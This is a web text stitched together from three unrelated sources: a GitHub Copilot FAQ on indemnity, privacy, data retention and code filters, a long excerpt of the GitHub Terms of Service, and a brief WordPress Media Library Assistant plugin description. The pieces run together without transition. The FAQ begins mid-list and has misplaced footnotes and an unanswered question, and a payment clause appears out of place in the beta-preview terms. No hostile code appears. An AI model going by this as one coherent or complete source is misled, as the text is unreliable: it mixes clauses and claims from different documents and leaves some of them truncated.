* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.

GeneralPlans & PricingPrivacyResponsible AI
### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

## [The GitHub Terms of Service](#the-github-terms-of-service)

Effective date: November 16, 2020

## [A. Definitions](#a-definitions)

**Short version:** *We use these basic terms throughout the agreement, and they have specific meanings. You should know what we mean when we use each of the terms. There's not going to be a test on it, but it's still useful information.*

1. An "Account" represents your legal relationship with GitHub. A “Personal Account” represents an individual User’s authorization to log in to and use the Service and serves as a User’s identity on GitHub. “Organizations” are shared workspaces that may be associated with a single entity or with one or more Users where multiple Users can collaborate across many projects at once. A Personal Account can be a member of any number of Organizations.
2. The “Agreement” refers, collectively, to all the terms, conditions, notices contained or referenced in this document (the “Terms of Service” or the "Terms") and all other operating rules, policies (including the GitHub Privacy Statement, available at [github.com/site/privacy](https://github.com/site/privacy)) and procedures that we may publish from time to time on the Website. Most of our site policies are available at [docs.github.com/categories/site-policy](/en/site-policy).
3. "Beta Previews" mean software, services, or features identified as alpha, beta, preview, early access, or evaluation, or words or phrases with similar meanings.
4. “Content” refers to content featured or displayed through the Website, including without limitation code, text, data, articles, images, photographs, graphics, software, applications, packages, designs, features, and other materials that are available on the Website or otherwise available through the Service. "Content" also includes Services. “User-Generated Content” is Content, written or otherwise, created or uploaded by our Users. "Your Content" is Content that you create or own.
5. “GitHub,” “We,” and “Us” refer to GitHub, Inc., as well as our affiliates, directors, subsidiaries, contractors, licensors, officers, agents, and employees.
6. The “Service” refers to the applications, software, products, and services provided by GitHub, including any Beta Previews.
7. “The User,” “You,” and “Your” refer to the individual person, company, or organization that has visited or is using the Website or Service; that accesses or uses any part of the Account; or that directs the use of the Account in the performance of its functions. A User must be at least 13 years of age. Special terms may apply for business or government Accounts (See [Section B(5): Additional Terms](#5-additional-terms)).
8. The “Website” refers to GitHub’s website located at [github.com](https://github.com/), and all content, services, and products provided by GitHub at or through the Website. It also refers to GitHub-owned subdomains of github.com, such as [education.github.com](https://education.github.com/) and [pages.github.com](https://pages.github.com/). These Terms also govern GitHub’s conference websites, such as [githubuniverse.com](https://githubuniverse.com/), and product websites, such as [electronjs.org](https://www.electronjs.org/). Occasionally, websites owned by GitHub may provide different or additional terms of service. If those additional terms conflict with this Agreement, the more specific terms apply to the relevant page or service.

## [B. Account Terms](#b-account-terms)

**Short version:** *Personal Accounts and Organizations have different administrative controls; a human must create your Account; you must be 13 or over; you must provide a valid email address; and you may not have more than one free Account. You alone are responsible for your Account and anything that happens while you are signed in to or using your Account. You are responsible for keeping your Account secure.*

### [1. Account Controls](#1-account-controls)

* Users. Subject to these Terms, you retain ultimate administrative control over your Personal Account and the Content within it.
* Organizations. The "owner" of an Organization that was created under these Terms has ultimate administrative control over that Organization and the Content within it. Within the Service, an owner can manage User access to the Organization’s data and projects. An Organization may have multiple owners, but there must be at least one Personal Account designated as an owner of an Organization. If you are the owner of an Organization under these Terms, we consider you responsible for the actions that are performed on or through that Organization.

### [2. Required Information](#2-required-information)

You must provide a valid email address in order to complete the signup process. Any other information requested, such as your real name, is optional, unless you are accepting these terms on behalf of a legal entity (in which case we need more information about the legal entity) or if you opt for a [paid Account](#k-payment), in which case additional information will be necessary for billing purposes.

### [3. Account Requirements](#3-account-requirements)

We have a few simple rules for Personal Accounts on GitHub's Service.

* You must be a human to create an Account. Accounts registered by "bots" or other automated methods are not permitted. We do permit machine accounts:
* A machine account is an Account set up by an individual human who accepts the Terms on behalf of the Account, provides a valid email address, and is responsible for its actions. A machine account is used exclusively for performing automated tasks. Multiple users may direct the actions of a machine account, but the owner of the Account is ultimately responsible for the machine's actions. You may maintain no more than one free machine account in addition to your free Personal Account.
* One person or legal entity may maintain no more than one free Account (if you choose to control a machine account as well, that's fine, but it can only be used for running a machine).
* You must be age 13 or older. While we are thrilled to see brilliant young coders get excited by learning to program, we must comply with United States law. GitHub does not target our Service to children under 13, and we do not permit any Users under 13 on our Service. If we learn of any User under the age of 13, we will [terminate that User’s Account immediately](#l-cancellation-and-termination). If you are a resident of a country outside the United States, your country’s minimum age may be older; in such a case, you are responsible for complying with your country’s laws.
* Your login may only be used by one person — i.e., a single login may not be shared by multiple people. A paid Organization may only provide access to as many Personal Accounts as your subscription allows.
* You may not use GitHub in violation of export control or sanctions laws of the United States or any other applicable jurisdiction. You may not use GitHub if you are or are working on behalf of a [Specially Designated National (SDN)](https://www.treasury.gov/resource-center/sanctions/SDN-List/Pages/default.aspx) or a person subject to similar blocking or denied party prohibitions administered by a U.S. government agency. GitHub may allow persons in certain sanctioned countries or territories to access certain GitHub services pursuant to U.S. government authorizations. For more information, please see our [Export Controls policy](/en/site-policy/other-site-policies/github-and-trade-controls).

### [4. Account Security](#4-account-security)

You are responsible for keeping your Account secure while you use our Service. We offer tools such as two-factor authentication to help you maintain your Account's security, but the content of your Account and its security are up to you.

* You are responsible for all content posted and activity that occurs under your Account (even when content is posted by others who have Accounts under your Account).
* You are responsible for maintaining the security of your Account and password. GitHub cannot and will not be liable for any loss or damage from your failure to comply with this security obligation.
* You will promptly notify GitHub by contacting us through the [GitHub Support portal](https://support.github.com/) if you become aware of any unauthorized use of, or access to, our Service through your Account, including any unauthorized use of your password or Account.

### [5. Additional Terms](#5-additional-terms)

In some situations, third parties' terms may apply to your use of GitHub. For example, you may be a member of an organization on GitHub with its own terms or license agreements; you may download an application that integrates with GitHub; or you may use GitHub to authenticate to another service. Please be aware that while these Terms are our full agreement with you, other parties' terms govern their relationships with you.

If you are a government User or otherwise accessing or using any GitHub Service in a government capacity, this [Government Amendment to GitHub Terms of Service](/en/site-policy/site-policy-deprecated/amendment-to-github-terms-of-service-applicable-to-us-federal-government-users) applies to you, and you agree to its provisions.

If you have signed up for GitHub Enterprise Cloud, the [Enterprise Cloud Addendum](/en/site-policy/site-policy-deprecated/github-enterprise-service-level-agreement) applies to you, and you agree to its provisions.

## [C. Acceptable Use](#c-acceptable-use)

**Short version:** *GitHub hosts a wide variety of collaborative projects from all over the world, and that collaboration only works when our users are able to work together in good faith. While using the service, you must follow the terms of this section, which include some restrictions on content you can post, conduct on the service, and other limitations. In short, be excellent to each other.*

Your use of the Website and Service must not violate any applicable laws, including copyright or trademark laws, export control or sanctions laws, or other laws in your jurisdiction. You are responsible for making sure that your use of the Service is in compliance with laws and any applicable regulations.

You agree that you will not under any circumstances violate our [Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) or [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

## [D. User-Generated Content](#d-user-generated-content)

**Short version:** *You own content you create, but you allow us certain rights to it, so that we can display and share the content you post. You still have control over your content, and responsibility for it, and the rights you grant us are limited to those we need to provide the service. We have the right to remove content or close Accounts if we need to.*

### [1. Responsibility for User-Generated Content](#1-responsibility-for-user-generated-content)

You may create or upload User-Generated Content while using the Service. You are solely responsible for the content of, and for any harm resulting from, any User-Generated Content that you post, upload, link to or otherwise make available via the Service, regardless of the form of that Content. We are not responsible for any public display or misuse of your User-Generated Content.

### [2. GitHub May Remove Content](#2-github-may-remove-content)

We have the right to refuse or remove any User-Generated Content that, in our sole discretion, violates any laws or [GitHub terms or policies](/en/site-policy). User-Generated Content displayed on GitHub Mobile may be subject to mobile app stores' additional terms.

### [3. Ownership of Content, Right to Post, and License Grants](#3-ownership-of-content-right-to-post-and-license-grants)

You retain ownership of and responsibility for Your Content. If you're posting anything you did not create yourself or do not own the rights to, you agree that you are responsible for any Content you post; that you will only submit Content that you have the right to post; and that you will fully comply with any third party licenses relating to Content you post.

Because you retain ownership of and responsibility for Your Content, we need you to grant us — and other GitHub Users — certain legal permissions, listed in Sections D.4 — D.7. These license grants apply to Your Content. If you upload Content that already comes with a license granting GitHub the permissions we need to run our Service, no additional license is required. You understand that you will not receive any payment for any of the rights granted in Sections D.4 — D.7. The licenses you grant to us will end when you remove Your Content from our servers, unless other Users have forked it.

### [4. License Grant to Us](#4-license-grant-to-us)

We need the legal right to do things like host Your Content, publish it, and share it. You grant us and our legal successors the right to store, archive, parse, and display Your Content, and make incidental copies, as necessary to provide the Service, including improving the Service over time. This license includes the right to do things like copy it to our database and make backups; show it to you and other users; parse it into a search index or otherwise analyze it on our servers; share it with other users; and perform it, in case Your Content is something like music or video.

This license does not grant GitHub the right to sell Your Content. It also does not grant GitHub the right to otherwise distribute or use Your Content outside of our provision of the Service, except that as part of the right to archive Your Content, GitHub may permit our partners to store and archive Your Content in public repositories in connection with the [GitHub Arctic Code Vault and GitHub Archive Program](https://archiveprogram.github.com/).

### [5. License Grant to Other Users](#5-license-grant-to-other-users)

Any User-Generated Content you post publicly, including issues, comments, and contributions to other Users' repositories, may be viewed by others. By setting your repositories to be viewed publicly, you agree to allow others to view and "fork" your repositories (this means that others may make their own copies of Content from your repositories in repositories they control).

If you set your pages and repositories to be viewed publicly, you grant each User of GitHub a nonexclusive, worldwide license to use, display, and perform Your Content through the GitHub Service and to reproduce Your Content solely on GitHub as permitted through GitHub's functionality (for example, through forking). You may grant further rights if you [adopt a license](/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository#including-an-open-source-license-in-your-repository). If you are uploading Content you did not create or own, you are responsible for ensuring that the Content you upload is licensed under terms that grant these permissions to other GitHub Users.

### [6. Contributions Under Repository License](#6-contributions-under-repository-license)

Whenever you add Content to a repository containing notice of a license, you license that Content under the same terms, and you agree that you have the right to license that Content under those terms. If you have a separate agreement to license that Content under different terms, such as a contributor license agreement, that agreement will supersede.

Isn't this just how it works already? Yep. This is widely accepted as the norm in the open-source community; it's commonly referred to by the shorthand "inbound=outbound". We're just making it explicit.

### [7. Moral Rights](#7-moral-rights)

You retain all moral rights to Your Content that you upload, publish, or submit to any part of the Service, including the rights of integrity and attribution. However, you waive these rights and agree not to assert them against us, to enable us to reasonably exercise the rights granted in Section D.4, but not otherwise.

To the extent this agreement is not enforceable by applicable law, you grant GitHub the rights we need to use Your Content without attribution and to make reasonable adaptations of Your Content as necessary to render the Website and provide the Service.

## [E. Private Repositories](#e-private-repositories)

**Short version:** *We treat the content of private repositories as confidential, and we only access it as described in our Privacy Statement—for security purposes, to assist the repository owner with a support matter, to maintain the integrity of the Service, to comply with our legal obligations, if we have reason to believe the contents are in violation of the law, or with your consent.*

### [1. Control of Private Repositories](#1-control-of-private-repositories)

Some Accounts may have private repositories, which allow the User to control access to Content.

### [2. Confidentiality of Private Repositories](#2-confidentiality-of-private-repositories)

GitHub considers the contents of private repositories to be confidential to you. GitHub will protect the contents of private repositories from unauthorized use, access, or disclosure in the same manner that we would use to protect our own confidential information of a similar nature and in no event with less than a reasonable degree of care.

### [3. Access](#3-access)

GitHub personnel may only access the content of your private repositories in the situations described in our [Privacy Statement](/en/site-policy/privacy-policies/github-privacy-statement#repository-contents).

You may choose to enable additional access to your private repositories. For example:

* You may enable various GitHub services or features that require additional rights to Your Content in private repositories. These rights may vary depending on the service or feature, but GitHub will continue to treat your private repository Content as confidential. If those services or features require rights in addition to those we need to provide the GitHub Service, we will provide an explanation of those rights.

Additionally, we may be [compelled by law](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure) to disclose the contents of your private repositories.

GitHub will provide notice regarding our access to private repository content, unless [for legal disclosure](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure), to comply with our legal obligations, or where otherwise bound by requirements under law, for automated scanning, or if in response to a security threat or other risk to security.

## [F. Copyright Infringement and DMCA Policy](#f-copyright-infringement-and-dmca-policy)

If you believe that content on our website violates your copyright, please contact us in accordance with our [Digital Millennium Copyright Act Policy](/en/site-policy/content-removal-policies/dmca-takedown-policy). If you are a copyright owner and you believe that content on GitHub violates your rights, please contact us via [our convenient DMCA form](https://github.com/contact/dmca) or by emailing copyright@github.com. There may be legal consequences for sending a false or frivolous takedown notice. Before sending a takedown request, you must consider legal uses such as fair use and licensed uses.

We will terminate the Accounts of [repeat infringers](/en/site-policy/content-removal-policies/dmca-takedown-policy#e-repeated-infringement) of this policy.

## [G. Intellectual Property Notice](#g-intellectual-property-notice)

**Short version:** *We own the service and all of our content. In order for you to use our content, we give you certain rights to it, but you may only use our content in the way we have allowed.*

### [1. GitHub's Rights to Content](#1-githubs-rights-to-content)

GitHub and our licensors, vendors, agents, and/or our content providers retain ownership of all intellectual property rights of any kind related to the Website and Service. We reserve all rights that are not expressly granted to you under this Agreement or by law. The look and feel of the Website and Service is copyright © GitHub, Inc. All rights reserved. You may not duplicate, copy, or reuse any portion of the HTML/CSS, JavaScript, or visual design elements or concepts without express written permission from GitHub.

### [2. GitHub Trademarks and Logos](#2-github-trademarks-and-logos)

If you’d like to use GitHub’s trademarks, you must follow all of our trademark guidelines, including those on our logos page: <https://github.com/logos>.

### [3. License to GitHub Policies](#3-license-to-github-policies)

This Agreement is licensed under this [Creative Commons Zero license](https://creativecommons.org/publicdomain/zero/1.0/). For details, see our [site-policy repository](https://github.com/github/site-policy#license).

## [H. API Terms](#h-api-terms)

**Short version:** *You agree to these Terms of Service, plus this Section H, when using any of GitHub's APIs (Application Provider Interface), including use of the API through a third party product that accesses GitHub.*

Abuse or excessively frequent requests to GitHub via the API may result in the temporary or permanent suspension of your Account's access to the API. GitHub, in our sole discretion, will determine abuse or excessive usage of the API. We will make a reasonable attempt to warn you via email prior to suspension.

You may not share API tokens to exceed GitHub's rate limitations.

You may not use the API to download data or Content from GitHub for spamming purposes, including for the purposes of selling GitHub users' personal information, such as to recruiters, headhunters, and job boards.

All use of the GitHub API is subject to these Terms of Service and the [GitHub Privacy Statement](https://github.com/site/privacy).

GitHub may offer subscription-based access to our API for those Users who require high-throughput access or access that would result in resale of GitHub's Service.

## [I. GitHub Additional Product Terms](#i-github-additional-product-terms)

**Short version:** *You need to follow certain specific terms and conditions for GitHub's various features and products, and you agree to the Supplemental Terms and Conditions when you agree to this Agreement.*

Some Service features may be subject to additional terms specific to that feature or product as set forth in the GitHub Additional Product Terms. By accessing or using the Services, you also agree to the [GitHub Additional Product Terms](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

## [J. Beta Previews](#j-beta-previews)

**Short version:** *Beta Previews may not be supported or may change at any time. You may receive confidential information through those programs that must remain confidential while the program is private. We'd love your feedback to make our Beta Previews better.*

### [1. Subject to Change](#1-subject-to-change)

Beta Previews may not be supported and may be changed at any time without notice. In addition, Beta Previews are not subject to the same security measures and auditing to which the Service has been and is subject. **By using a Beta Preview, you use it at your own risk.**

### [2. Confidentiality](#2-confidentiality)

As a user of Beta Previews, you may get access to special information that isn’t available to the rest of the world. Due to the sensitive nature of this information, it’s important for us to make sure that you keep that information secret.

**Confidentiality Obligations.** You agree that any non-public Beta Preview information we give you, such as information about a private Beta Preview, will be considered GitHub’s confidential information (collectively, “Confidential Information”), regardless of whether it is marked or identified as such. You agree to only use such Confidential Information for the express purpose of testing and evaluating the Beta Preview (the “Purpose”), and not for any other purpose. You should use the same degree of care as you would with your own confidential information, but no less than reasonable precautions to prevent any unauthorized use, disclosure, publication, or dissemination of our Confidential Information. You promise not to disclose, publish, or disseminate any Confidential Information to any third party, unless we don’t otherwise prohibit or restrict such disclosure (for example, you might be part of a GitHub-organized group discussion about a private Beta Preview feature).

**Exceptions.** Confidential Information will not include information that is: (a) or becomes publicly available without breach of this Agreement through no act or inaction on your part (such as when a private Beta Preview becomes a public Beta Preview); (b) known to you before we disclose it to you; (c) independently developed by you without breach of any confidentiality obligation to us or any third party; or (d) disclosed with permission from GitHub. You will not violate the terms of this Agreement if you are required to disclose Confidential Information pursuant to operation of law, provided GitHub has been given reasonable advance written notice to object, unless prohibited by law.

### [3. Feedback](#3-feedback)

We’re always trying to improve of products and services, and your feedback as a Beta Preview user will help us do that. If you choose to give us any ideas, know-how, algorithms, code contributions, suggestions, enhancement requests, recommendations or any other feedback for our products or services (collectively, “Feedback”), you acknowledge and agree that GitHub will have a royalty-free, fully paid-up, worldwide, transferable, sub-licensable, irrevocable and perpetual license to implement, use, modify, commercially exploit and/or incorporate the Feedback into our products, services, and documentation.

In order to treat everyone equally, no exceptions will be made.

**Payment Based on Usage** Some Service features are billed based on your usage. A limited quantity of these Service features may be included in your plan for a limited term without additional charge. If you choose to use paid Service features beyond the quantity included in your plan, you pay for those Service features based on your actual usage in the preceding month. Monthly payment for these purchases will be charged on a periodic basis in arrears.

## Description

The Media Library Assistant provides several enhancements for managing the Media Library, including:

* The **`[mla_gallery]` shortcode**, used in a post, page or custom post type to add a gallery of images and/or other Media Library items (such as PDF documents). MLA Gallery is a superset of the WordPress `[gallery]` shortcode; it is compatible with `[gallery]` and provides many enhancements. These include: 1) full query and display support for WordPress categories, tags, custom taxonomies and custom fields, 2) support for all post\_mime\_type values, not just images 3) media Library items need not be « attached » to the post, and 4) control over the styles, markup and content of each gallery using Style and Markup Templates. **Twenty-eight hooks** are provided for complete gallery customization from your theme or plugin code.
* The **`[mla_tag_cloud]` shortcode**, used in a post, page, custom post type or widget to display the « most used » terms in your Media Library where the size of each term is determined by how many times that particular term has been assigned to Media Library items. **Twenty-five hooks** are provided for complete cloud customization from your theme or plugin code.
